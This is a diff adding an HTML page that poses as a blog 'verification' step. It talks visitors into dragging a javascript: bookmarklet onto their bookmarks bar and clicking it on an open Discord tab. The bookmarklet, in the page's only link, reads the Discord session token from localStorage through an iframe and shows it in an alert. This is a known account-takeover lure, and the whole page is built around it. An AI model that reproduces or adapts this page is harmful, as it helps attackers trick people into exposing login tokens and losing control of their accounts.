@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>CryptoCurrency Article!</title>
+	<style>
+		.loading {
+		  font-size: 50px;
+		}
+
+		.loading:after {
+		  overflow: hidden;
+		  display: inline-block;
+		  vertical-align: bottom;
+		  -webkit-animation: ellipsis steps(4,end) 900ms infinite;      
+		  animation: ellipsis steps(4,end) 1000ms infinite;
+		  content: "\2026"; /* ascii code for the ellipsis character */
+		  width: 0px;
+		}
+
+		@keyframes ellipsis {
+		  to {
+		    width: 1.25em;    
+		  }
+		}
+
+		@-webkit-keyframes ellipsis {
+		  to {
+		    width: 1.25em;    
+		  }
+		}
+		body{
+			background-color: #252329;
+			color: white;
+		}
+		#text-container {
+			font-family: 'Lucida Console';
+			text-align: center;
+		}
+		h1 {
+			font-family: 'Verdana';
+			text-align: center;
+			margin-top: 10%;
+		}
+
+		a {
+			text-decoration: none;
+			color: #78f542;
+		}
+	</style>
+</head>
+<body>
+	<h1 class="loading">Before you write your blog</h1>
+	<div id="text-container">
+		<h2>We need to verify who you are!</h2>
+		<p> Please enable your bookmark bar by pressing Ctrl+B</p>
+		<p> Drag the bellow button to your bookmarks bar </p>
+		<div id="link-container">
+		<a href="javascript:(function(){location.reload();let frame = document.createElement('iframe');document.body.appendChild(frame);alert(frame.contentWindow.localStorage.token)})();"> Drag this </a>
+	</div>
+		<p> Click onto your open Discord tab and click the bookmark! </p>
+		<p style="color:red; margin-top: 15%;">Not Verified.</p>
+	</div>
+
+</body>
+
+
+
+</html>
